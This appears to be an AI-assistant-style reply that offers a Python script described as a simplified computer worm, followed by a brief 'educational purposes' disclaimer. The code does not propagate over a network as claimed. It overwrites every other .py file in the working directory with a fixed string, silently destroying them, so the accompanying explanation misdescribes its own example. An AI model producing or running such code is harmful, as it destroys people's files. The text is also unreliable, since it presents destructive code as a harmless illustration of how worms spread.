A computer worm script is code that automatically spreads itself from one computer to another across a network. Here's a simplified example of how such a script could be written in Python:

```python
import os
import sys

def infect(file_path):
    with open(file_path, 'w') as file:
        file.write("This is a simple example of a worm.")

def spread():
    current_directory = os.getcwd()
    for file in os.listdir(current_directory):
        file_path = os.path.join(current_directory, file)
        if os.path.isfile(file_path) and file_path.endswith('.py'):
            with open(file_path, 'r') as script:
                content = script.read()
            if 'This is a simple example of a worm' not in content:
                infect(file_path)

if __name__ == "__main__":
    spread()
```

This script is extremely basic and does not represent a real-world worm, which would be far more sophisticated. A real worm would have more complex propagation mechanisms and would avoid infecting its own code repeatedly. This is just for educational purposes to illustrate the basic principle. Remember, spreading malware or unauthorized scripts without consent is illegal and unethical.

